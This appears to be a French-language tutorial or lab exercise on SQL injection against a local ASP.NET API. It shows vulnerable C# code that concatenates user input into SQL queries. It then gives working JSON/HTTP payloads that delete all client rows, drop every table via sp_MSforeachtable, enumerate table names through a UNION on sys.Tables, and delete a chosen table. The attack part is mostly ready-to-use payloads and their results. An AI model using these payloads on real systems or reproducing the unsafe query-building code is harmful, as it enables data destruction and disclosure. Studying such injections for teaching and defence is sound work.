# 04 Injection `SQL`



## Mon attaque

Table avant attaque :

<img src="assets/before-injection-sql-oob.png" alt="before-injection-sql-oob" style="zoom:50%;" />

Code du programme :

```cs
int InsertClient(SqlConnection con, ClientDto client)
{
    var sql = $"INSERT INTO Client (nom, prenom) VALUES ('{client.Nom}', '{client.Prenom}')";
    var cmd = new SqlCommand(sql, con);

    con.Open();
    var rowsAffected = cmd.ExecuteNonQuery();

    return rowsAffected;
}
```

Les données ne sont pas échappées et directement concaténées dans la requête.

Requête `sql attack`

```http
POST https://localhost:7094/client
Content-Type: application/json

{
    "nom": "toto",
    "prenom": "Raymond');DELETE FROM Client;INSERT INTO Client (nom, prenom) VALUES('kill','kill"
}
```

contenu de la variable `sql` :

<img src="assets/sql-var-content-gty.png" alt="sql-var-content-gty" style="zoom:50%;" />

```sql
INSERT INTO Client (nom, prenom) VALUES ('toto', 'Raymond');
DELETE FROM Client;
INSERT INTO Client (nom, prenom) VALUES('kill','kill')
```

Résultat de l'attaque :

<img src="assets/after-injection-sql-cxx.png" alt="after-injection-sql-cxx" style="zoom:50%;" />



### Version hardcore

On peut aussi détruire toutes les tables :

Avant

<img src="assets/before-all-attack-table-tgq.png" alt="before-all-attack-table-tgq" style="zoom:33%;" />

Code de la requête :

```http
POST https://localhost:7094/client
Content-Type: application/json

{
    "nom": "Raymond');EXEC sp_MSforeachtable @command1 = 'DROP TABLE ?';INSERT INTO Two (b) VALUES('kill"
}
```

Requête pour détruire toutes les tables (stackoverflow : https://stackoverflow.com/questions/27606518/how-to-drop-all-tables-from-a-database-with-one-sql-query)

```sql
EXEC sp_MSforeachtable @command1 = "DROP TABLE ?"
```

Résultat :

<img src="assets/after-all-table-attack-uui.png" alt="after-all-table-attack-uui" style="zoom:50%;" />

Les tables n'existant plus, cela lève une erreur.



## Trouver le nom des tables

Méthode `c#` recevant la requête :

```c#
List<ClientDto> GetClientFiltering([FromBody] Filter filter, SqlConnection con)
{
    var cmd = new SqlCommand($"SELECT nom, prenom FROM Client WHERE prenom LIKE '{filter.FilterString}%'", con);
    con.Open();
    // ...
```

On va injecter ce code `SQL` dans la requête :

```json
GET https://localhost:7094/client/filter
Content-Type: application/json

{
    "filterString": "Sc' UNION SELECT name COLLATE SQL_Latin1_General_CP1_CI_AS, type_desc COLLATE SQL_Latin1_General_CP1_CI_AS FROM sys.Tables  --"
}
```

Ce qui donne le `SQL` complet

```sql
SELECT nom, prenom FROM Client WHERE prenom LIKE 's%' UNION SELECT name COLLATE SQL_Latin1_General_CP1_CI_AS, type_desc COLLATE SQL_Latin1_General_CP1_CI_AS FROM sys.Tables  -- %'
```

On utilise `--` pour annuler la fin de la requête et ne pas générer d'erreur de syntaxe `SQL`.

L'encodage de la table `sys.Tables` n'est pas le même que celui de `Client`, on utilise `COLLATE ENC_NAME` pour ré-encoder à la volée :

```sql
SELECT name COLLATE SQL_Latin1_General_CP1_CI_AS, ...
```

Pour un `UNION`, il faut le même nombre de colonnes, c'est le seul intérêt d'ajouter `type_desc`.

#### On récupère ainsi tous les noms de table !!!

```json

[
  {
    "nom": "bareme_salaire",
    "prenom": "USER_TABLE"
  },
  {
    "nom": "Bidon",
    "prenom": "USER_TABLE"
  },
  {
    "nom": "carte_fidelite",
    "prenom": "USER_TABLE"
  },
  {
    "nom": "Classique",
    "prenom": "USER_TABLE"
  },
  {
    "nom": "client",
    "prenom": "USER_TABLE"
  },
  // ...
```

Maintenant on attaque la table voulue facilement :

```http
GET https://localhost:7094/client/filter
Content-Type: application/json

{
    "filterString": "Sc'; DELETE FROM client  --"
}
```

